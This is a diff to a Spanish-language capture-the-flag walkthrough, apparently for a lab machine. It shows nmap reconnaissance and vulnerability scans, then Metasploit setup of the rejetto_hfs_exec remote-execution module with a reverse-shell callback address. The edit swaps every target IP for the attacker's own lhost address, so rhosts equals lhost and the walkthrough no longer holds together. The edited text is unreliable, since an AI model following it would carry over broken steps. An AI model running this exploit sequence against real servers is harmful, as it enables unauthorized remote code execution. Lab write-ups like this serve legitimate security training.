@@ -16,12 +16,12 @@ En esencia el vector de ataque es el siguiente:
 ## 1. Reconocimiento
 
 ```
-nmap -F 10.10.208.23
+nmap -F 10.8.153.49
 ```
 
 ```
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 16:16 EDT
-Nmap scan report for 10.10.208.23
+Nmap scan report for 10.8.153.49
 Host is up (0.35s latency).
 Not shown: 89 closed tcp ports (conn-refused)
 PORT      STATE SERVICE
@@ -41,7 +41,7 @@ PORT      STATE SERVICE
 Scan the machine with nmap. What is the other port running a web server on? **8080**
 
 ```
-sudo nmap -sV -p80,8080 --script=vuln,vulners 10.10.208.23
+sudo nmap -sV -p80,8080 --script=vuln,vulners 10.8.153.49
 ```
 
 ```
@@ -84,8 +84,8 @@ msf6 > use 0
 msf6 exploit(windows/http/rejetto_hfs_exec) > 
 ```
 ```
-msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.208.23
-rhosts => 10.10.208.23
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.8.153.49
+rhosts => 10.8.153.49
 msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
 rport => 8080
 msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.8.153.49
